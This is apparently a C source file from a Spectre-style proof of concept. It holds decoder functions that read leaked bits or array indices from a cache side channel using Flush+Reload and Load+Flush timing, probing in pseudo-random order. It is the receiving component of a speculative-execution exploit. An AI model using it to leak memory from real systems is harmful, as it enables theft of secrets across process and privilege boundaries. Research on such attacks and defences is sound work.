#include "../include/spectre.h"

uint64_t decode_flush_reload_bitwise(uint8_t side_channel[], uint8_t bits_count, uint64_t stride, size_t threshold)
{
    uint64_t out = 0;
    uint32_t rand_i;
    for (uint32_t i = 0; i < bits_count; i++)
    {
        rand_i = (((i) * 4079) + 13) % (bits_count);
        if (is_cached_load((side_channel) + ((rand_i+1) * stride), threshold))
        {
            out += DOUBLE_TIMES(1, (rand_i) % 8);
        }
    }
    return out;
}

uint64_t decode_load_flush_bitwise(uint8_t side_channel[], uint8_t bits_count, uint64_t stride, size_t threshold)
{
    uint64_t out = 0;
    for (uint32_t i = 1; i < bits_count + 1; i++)
    {
        if (!is_cached_load((side_channel) + (i * stride), threshold))
        {
            out += DOUBLE_TIMES(1, (i - 1) % 8);
        }
    }
    return out;
}

uint64_t decode_flush_reload_array_index(uint8_t side_channel[], uint8_t bits_count, uint64_t stride, size_t threshold)
{
    uint32_t element_count = powl(2, bits_count);
    uint64_t out = 0;
    uint32_t rand_i;
    for (uint32_t i = 0; i < element_count; i++)
    {
        rand_i = (((i) * 167) + 67) % element_count;
        // Index 0 is always cached because of training phase :/
        // But thats not an issue
        if (rand_i != 0 && is_cached_load((side_channel) + ((rand_i+1) * stride), threshold))
        {
            out = rand_i;
            break;
        }
    }
    return out;
}

uint64_t decode_flush_reload_dynamic(uint8_t side_channel[], uint8_t n_b, uint8_t n_a, uint64_t stride, size_t threshold)
{
    uint32_t element_count = powl(2, n_a);
    uint64_t out = 0;
    uint64_t tmp;
    uint32_t rand_j;
    for (uint32_t i = 0; i < n_b; i++)
    {
        tmp = 0;
        for (uint32_t j = 0; j < element_count-1; j++)
        {
            rand_j = ((((j) * 167) + 67) % (element_count-1));
            // Index 0 is always cached because of training phase :/
            // But thats not an issue
            if (rand_j != 0 && is_cached_load((side_channel) + ((rand_j) * stride), threshold))
            {
                tmp = rand_j+1;
                printf("%zu cached\n", tmp);
            } else {
                printf("%zu not cached\n", rand_j);
            }
        }
        out += tmp << i*n_a;
        side_channel += n_a * stride;
    }
    return out;
}
